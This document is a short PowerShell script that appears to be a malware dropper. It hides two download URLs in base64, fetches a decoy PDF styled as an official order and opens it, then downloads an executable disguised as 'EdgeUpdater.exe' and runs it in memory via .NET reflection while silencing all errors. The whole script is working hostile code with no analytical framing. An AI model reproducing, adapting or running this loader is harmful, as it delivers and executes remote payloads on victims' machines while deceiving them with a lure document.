$ErrorActionPreference = 'SilentlyContinue'

$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
$tempDir = $env:TEMP
$pdfPath = "$tempDir\nakaz.pdf"

Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
Start-Process $pdfPath

$exeBytes = (Invoke-WebRequest -Uri $exeUrl -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing).Content

$assembly = [System.Reflection.Assembly]::Load($exeBytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]] @()))
